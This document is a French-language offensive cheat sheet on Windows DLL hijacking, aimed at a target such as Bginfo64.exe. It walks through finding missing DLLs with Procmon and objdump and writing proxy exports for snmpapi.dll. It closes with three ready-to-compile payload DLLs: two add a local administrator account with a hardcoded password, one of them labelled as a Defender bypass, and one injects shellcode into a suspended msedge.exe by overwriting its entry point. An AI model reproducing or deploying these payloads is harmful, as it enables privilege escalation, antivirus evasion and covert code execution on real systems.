
| Priority | Location                                    | Example                     |
| -------- | ------------------------------------------- | --------------------------- |
| 1        | Directory from which the application loaded | `C:\Program Files\App\`     |
| 2        | System directory                            | `C:\Windows\System32\`      |
| 3        | 16-bit system directory                     | `C:\Windows\System\`        |
| 4        | Windows directory                           | `C:\Windows\`               |
| 5        | Current directory                           | `C:\Users\john\`            |
| 6        | PATH environment variable directories       | `C:\Python39\`, `C:\tools\` |

# 1. Ecrire le squelette de la DLL

```cpp
#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    // CODE ICI

    return TRUE;
}
```

---
# 2. Trouver les DLLs manquantes

**Identifier les DLLs manquantes avec [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)** (Nécessite admin, sinon reproduire en local sur sa propre machine)

```cmd
winget install Microsoft.Sysinternals.ProcessMonitor
```

Filtre dans Procmon :

- **Process Name** = `Bginfo64.exe` (ou ta cible)
- **Result** = `NAME NOT FOUND`
- **Path** ends with `.dll`

**Identifier les DLLs manquantes sur Kali**

```bash
strings Bginfo64.exe | grep -i .dll
objdump -p Bginfo64.exe | grep -i .dll
```

---
# 3. Identifier les fonctions importées

```bash
objdump -p Bginfo64.exe | grep -A 30 "nomDeLaDLL.dll"
```

Les lignes `Member-Name` sont les fonctions à proxifier.

---
# 4. Écrire les proxies

Pour chaque fonction trouvée, le pattern est toujours le même :

```cpp
static HMODULE hReal = LoadLibraryA("C:\\Windows\\System32\\nomDeLaDLL.dll");

extern "C" __declspec(dllexport) TYPE WINAPI NomDeLaFonction(PARAMS)
{
    static auto fn = (TYPE(WINAPI*)(PARAMS))GetProcAddress(hReal, "NomDeLaFonction");
    return fn ? fn(args) : VALEUR_PAR_DEFAUT;
}
```

Exemples :

https://learn.microsoft.com/fr-fr/windows/win32/api/snmp/nf-snmp-snmpsvcgetuptime
```Cpp
extern "C" __declspec(dllexport) DWORD WINAPI SnmpSvcGetUptime()
{
    static auto fn = (DWORD(WINAPI*)())GetProcAddress(hReal, "SnmpSvcGetUptime");
    return fn ? fn() : 0;
}
```

https://learn.microsoft.com/en-us/windows/win32/api/snmp/nf-snmp-snmputiloidncmp
```cpp
extern "C" __declspec(dllexport) INT WINAPI SnmpUtilOidNCmp(void* pOid1, void* pOid2, UINT cSubIds)
{
    static auto fn = (INT(WINAPI*)(void*, void*, UINT))GetProcAddress(hReal, "SnmpUtilOidNCmp");
    return fn ? fn(pOid1, pOid2, cSubIds) : 0;
}
```

https://learn.microsoft.com/fr-fr/windows/win32/api/snmp/nf-snmp-snmputiloidcpy
```cpp
extern "C" __declspec(dllexport) BOOL WINAPI SnmpUtilOidCpy(void* pOidDst, void* pOidSrc)
{
    static auto fn = (BOOL(WINAPI*)(void*, void*))GetProcAddress(hReal, "SnmpUtilOidCpy");
    return fn ? fn(pOidDst, pOidSrc) : FALSE;
}
```

**Valeur par défaut selon le type de retour :**

|Type retour|Valeur par défaut|
|---|---|
|`BOOL`|`FALSE`|
|`DWORD` / `INT` / `UINT`|`0`|
|`HANDLE` / pointeur|`NULL`|
|`void`|_(rien)_|

Pour les **signatures inconnues** (tu ne sais pas les paramètres exacts), cherche sur [learn.microsoft.com](https://learn.microsoft.com/) avec le nom de la fonction, ou utilise cette astuce : passe tout en `LPVOID` si tu ne l'utilises pas vraiment - BGInfo appellera la vraie implémentation de toute façon.

---
# 5. Compiler

[DLL](Compilation.md#DLL)

---
# Si d'autres erreurs apparaissent

C'est qu'une autre DLL système (chargée par ta cible) importe aussi depuis ta DLL hijackée. Même diagnostic :

```bash
objdump -p C:\Windows\System32\laDLLquiCrash.dll | grep -A 20 "nomDeLaDLL.dll"
```

Et tu ajoutes les fonctions manquantes au proxy.

# Exemples

## AddUser (no proxy)

```cpp
#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    system("net user john Password123! /add");
    system("net localgroup administrators john /add");

    return TRUE;
}
```

## Adduser bypass Defender (no proxy)

```c
/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>


DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("john");                // username
    ud.usri1_password    = _T("Password123!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}
```
## Classic injection (with proxy)

```cpp
#include <windows.h>
#include <winternl.h>
#include "shellcode.h"


static HMODULE hReal = LoadLibraryA("C:\\Windows\\System32\\snmpapi.dll");

extern "C" __declspec(dllexport) DWORD WINAPI SnmpSvcGetUptime()
{
    static auto fn = (DWORD(WINAPI*)())GetProcAddress(hReal, "SnmpSvcGetUptime");
    return fn ? fn() : 0;
};

extern "C" __declspec(dllexport) INT WINAPI SnmpUtilOidNCmp(void* pOctets1, void* pOctets2, UINT nSubIds)
{
    static auto fn = (INT(WINAPI*)(void*, void*, UINT))GetProcAddress(hReal, "SnmpUtilOidNCmp");
    return fn ? fn(pOctets1, pOctets2, nSubIds) : 0;
}

extern "C" __declspec(dllexport) INT WINAPI SnmpUtilOidCpy(void* pOidDst, void* pOidSec)
{
    static auto fn = (INT(WINAPI*)(void*, void*))GetProcAddress(hReal, "SnmpUtilOidCpy");
    return fn ? fn(pOidDst, pOidSec) : 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    unsigned char* shellcode = agent_x64_bin;
    unsigned int shellcode_len = agent_x64_bin_len;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcessW(
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        shellcode_len,
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);

    return TRUE;
}
```